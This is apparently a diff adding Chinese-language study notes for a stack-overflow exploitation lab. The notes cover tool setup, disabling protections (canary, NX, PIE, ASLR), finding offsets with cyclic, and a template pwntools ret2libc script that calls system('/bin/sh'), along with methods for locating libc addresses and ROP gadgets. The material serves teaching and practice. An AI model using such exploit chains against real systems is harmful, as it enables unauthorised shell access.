@@ -1,0 +1,122 @@
+
+1. 安装 pwntools, pwngdb, ghidra(optional)
+https://docs.pwntools.com/en/stable/install.html
+apt-get update
+apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
+python3 -m pip install --upgrade pip
+python3 -m pip install --upgrade pwntools
+
+https://github.com/pwndbg/pwndbg
+git clone https://github.com/pwndbg/pwndbg
+cd pwndbg
+./setup.sh
+
+Note: 以上工具可能因dependency的问题导致不能成功按照，可以更换OS进行尝试。
+
+https://ghidra-sre.org/
+用于逆向看代码，因是静态分析，故可将其安装在host上面，然后把binary从vm拖出来分析。
+
+2. 程序编译选项和系统选项
+关闭/开启Stack保护(stack canary)
+-fno-stack-protector
+-fstack-protector
+
+关闭NX
+-z execstack
+
+关闭/开启 pie
+-no-pie
+-pie
+
+32bit 编译选项(64bit OS上)
+-m32
+
+ASLR设置
+cat /proc/sys/kernel/randomize_va_space
+sudo sysctl -w kernel.randomize_va_space=? (0或2) 
+
+
+3. pwntools 工具
+checksec file-to-check
+
+cyclic 50
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama (举例)
+创建用于栈溢出的输入
+
+ulimit -c unlimited 
+设置产生core文件，即记录程序运行发生段错误时的信息
+
+echo -e "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama" | ./stack_test
+
+gdb ./stack_test core
+查看错误发生时eip的内容
+
+cyclic -l laaa
+根据eip的内容确定从buffer起始位置到ret之间的距离
+
+
+4. exploit 脚本
+python3 ./exploit.py
+
+以下为示例脚本
+from pwn import *
+p = process("./stack_test")
+
+PR = 0xbfc0ffee  # need to change accordingly; PPR, PPPR may also needed
+# "pop ret" gagdet is used for cleaning stack, in 32bit system
+
+payload = b'A' * num
+
+# open("/tmp/flag", 0)  #some note for file reading
+# read(3, buf, 1048)
+# write(1, buf, 1048)
+
+# BUF = 0x804c500
+# payload += p32(READ)
+# payload += p32(PPPR)
+# payload += p32(0)
+# payload += p32(BUF)
+# payload += p32(len("/tmp/flag"))
+
+payload += p32(0xbfc0ffee) # printf
+payload += p32(PR)
+payload += p32(0xbfc0ffee) # "/bin/sh"
+
+payload += p32(0xbfc0ffee) # system 
+payload += p32(PR)
+payload += p32(0xbfc0ffee) # "/bin/sh" 
+
+payload += p32(0xbfc0ffee) # exit
+payload += p32(0xdeadbeef)
+payload += p32(0) # nicely exit
+
+p.sendline(payload)
+
+#p.recvuntil("blabla") #receive data until one of delims ("blabla") is encountered.
+#p.send("/tmp/flag")  # send more info 
+
+p.interactive()
+
+# More info about pwntools: 
+# https://docs.pwntools.com/en/stable/index.html
+
+5. 关于找到lic(或主程序)中相应的address
+
+使用gdb调试，如在gdb中：
+p system
+
+找到一个libc中的一个address以后，可以：
+1）同样方法找其它的address
+2）计算libc的基地址，然后根据libc的elf文件中的相对地址，计算出需要的函数地址
+   LIBC = 0xbfc0ffee - 0x00045000  	# 前者为gdb中调试获得，后者通过如下方法获得：
+     readelf -a /usr/lib32/libc.so.6 | grep " system"
+   READ = LIBC + 0x000f1f30    		# 后者同样：
+	 readelf -a /usr/lib32/libc.so.6 | grep " read"
+   BINSH = LIBC + 0x0018c33c   # 后者通过以下命令获得（也可以在gdb中通过 find &system,+9999999,"/bin/sh" ）：
+     ropper --file /usr/lib32/libc.so.6 --string "/bin/sh"  
+
+pop-ret gadget的获取：
+1）在ghidra中人工在主程序中查找
+2）通过ropper在主程序（或者libc，主程序找不到的情况下）中查找，注意：如果是libc中查找到的，需要加上libc的基地址
+  ropper --file ./stack_test | grep "pop" | grep "ret"
+
